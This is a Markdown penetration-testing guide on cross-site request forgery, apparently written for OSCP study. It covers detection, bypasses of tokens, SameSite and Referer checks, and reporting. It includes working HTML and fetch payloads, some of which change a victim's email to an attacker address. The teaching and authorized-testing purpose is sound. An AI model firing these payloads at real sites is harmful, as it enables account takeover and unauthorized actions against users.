# CSRF (Cross-Site Request Forgery)

> CSRF forces an authenticated victim to send a request they did not intend.
> The browser attaches session cookies automatically, so the server sees
> a legitimate request.

> [!CAUTION]
> Authorized use only. See [../../SECURITY.md](../../../SECURITY.md).

---

## Table of Contents

- [1. Overview](#1-overview)
- [2. Scope & OPSEC](#2-scope--opsec)
- [3. Detection](#3-detection)
- [4. Exploitation](#4-exploitation)
- [5. Bypasses](#5-bypasses)
- [6. Tools](#6-tools)
- [7. OSCP Notes](#7-oscp-notes)
- [8. Cheatsheet](#8-cheatsheet)
- [9. References](#9-references)

---

## 1. Overview

CSRF = a state-changing action is performed via a forged cross-site request.
The server trusts the request because the victim browser automatically sends
their session cookie.

**Preconditions (all required):**

1. A sensitive action (change email, password, funds transfer, admin action).
2. Cookie-based authentication (Session, JWT in cookie).
3. No unpredictable parameter (CSRF token, nonce).
4. Request works without additional secrets.

**Impact:**

- Account takeover (change email -> password reset).
- Privilege escalation (create admin user).
- Data modification or deletion.
- Money transfer.

**On OSCP:** CSRF rarely appears alone. Usually chained with XSS or used
to pivot admin actions in a lab scenario.

---

## 2. Scope & OPSEC

### 2.1 Risk

| Action | Tag |
|--------|-----|
| Reading the CSRF protections | [PROD] |
| Generating a PoC HTML (no send) | [PROD] |
| Sending a CSRF against your own account | [PROD-RISK] |
| CSRF against another user | [PROD-NO] |
| CSRF + XSS chain (admin action) | [PROD-NO] |

### 2.2 What NOT to do (production)

- Do NOT trigger state-changing actions on other users' accounts.
- Do NOT change emails / passwords without approval.
- Do NOT forge admin actions.
- Do NOT leave test CSRF payloads accessible.

In production, prove CSRF by showing the request lacks a token, and by
having the client confirm a self-targeted test on a low-impact endpoint.

---

## 3. Detection

### 3.1 Where to look

- Password / email change forms.
- Profile updates.
- Admin-only actions (create user, role change).
- Payment / transfer forms.
- Settings pages.
- API endpoints triggered via GET without body.

### 3.2 What to check

Open DevTools / Burp and look at the request:

- **No CSRF token** in body or header? Good sign.
- **Token is in a cookie only** (double-submit)? Can be bypassed if attacker
  can set cookies.
- **Token is static / predictable**? Also vulnerable.
- **SameSite** attribute on session cookie? Missing / None / Lax -> CSRF
  easier. Strict blocks most CSRF.

### 3.3 Test flow

1. Log in as user A in one browser.
2. Craft an HTML page that triggers the action.
3. Open the page in the same browser (any tab).
4. Check whether the action executed.

---

## 4. Exploitation

### 4.1 Simple GET-based CSRF

If the action uses GET:

```html
<img src="http://target/change-email?email=attacker@evil.com">
```

When the victim loads any page with this image, the request fires.

### 4.2 POST-based CSRF

```html
<html>
<body onload="document.forms[0].submit()">
  <form action="http://target/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com" >
  </form>
</body>
</html>
```

### 4.3 JSON-body CSRF

If the endpoint expects application/json, use fetch with
Content-Type: text/plain and a body that parses as JSON:

```html
<script>
fetch('http://target/api/user', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'text/plain'},
  body: JSON.stringify({email: 'attacker@evil.com'})
});
</script>
```

Some frameworks accept text/plain and parse it as JSON.

### 4.4 Chaining with XSS

If the app has a CSRF token but also has XSS, use XSS to read the token
and issue the request. See [XSS.md](./XSS.md) section 7.

---

## 5. Bypasses

### 5.1 Token presence bypass

| Scenario | Bypass |
|----------|--------|
| Token in body only, not checked | Remove the token entirely |
| Token validated against session but not user | Use your own token against victim |
| Token is a static value | Guess it, or reuse from another session |
| Token has low entropy | Brute (rare) |
| Token empty string accepted | Send empty |

### 5.2 SameSite cookie bypass

| SameSite value | Bypass |
|----------------|--------|
| Missing (default) | No protection |
| Lax | GET top-level navigation still sends cookie |
| Strict | Needs a same-site gadget (subdomain takeover, XSS) |
| None (no Secure) | Attacker can set cookies, or MITM |

### 5.3 Double-submit cookie bypass

Server sets csrf=random cookie and expects it in a header or body.
Attacker can set their own cookie via a subdomain if not restricted.

### 5.4 Content-Type-based

Some backends accept multiple content types. If text/plain is accepted,
attacker avoids the JSON preflight.

### 5.5 Referer / Origin bypass

Some apps check Referer header. Bypass if:

- Referer check only rejects a substring (use target.com.attacker.com).
- Missing Referer accepted.
- Referer is not checked on GET, only on POST.

---

## 6. Tools

| Tool | Purpose |
|------|---------|
| Burp Suite | Generate CSRF PoC automatically |
| XSRFProbe | Automated CSRF scanner |
| CSRFTester | Legacy scanner |
| OWASP ZAP | CSRF scan + anti-CSRF token analysis |

**Burp workflow:**

1. Right-click the request -> Engagement tools -> Generate CSRF PoC.
2. Burp produces an HTML page that triggers the action.
3. Test locally, then share with the client.

---

## 7. OSCP Notes

> [!IMPORTANT]
> OSCP report:
> - Screenshot the vulnerable request (no CSRF token).
> - Screenshot the generated PoC HTML.
> - Screenshot the action triggered (before / after state).
> - If chained with XSS, show the chain.
>
> CSRF is usually part of an exploitation chain, not a foothold by itself.
>
> See [../../methodology/OSCP-Reporting.md](../../../methodology/OSCP-Reporting.md).

---

## 8. Cheatsheet

```html
<!-- GET-based -->
<img src="http://target/action?param=value">

<!-- POST auto-submit -->
<body onload="document.forms[0].submit()">
  <form action="http://target/action" method="POST">
    <input type="hidden" name="param" value="value" >
  </form>
</body>

<!-- JSON via text/plain -->
<script>
fetch('http://target/api/action', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'text/plain'},
  body: '"""'
});
</script>
```

---

## 9. References

- OWASP CSRF - https://owasp.org/www-community/attacks/csrf
- PortSwigger CSRF - https://portswigger.net/web-security/csrf
- PayloadsAllTheThings CSRF - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection
- SameSite cookies - https://web.dev/samesite-cookies-explained/

> See also: [XSS.md](./XSS.md), [../06 Technologies/JWT.md](../06%20Technologies/JWT.md)

---

*Part of Bugterium. English only by design. Last updated: 2026-10-11.*
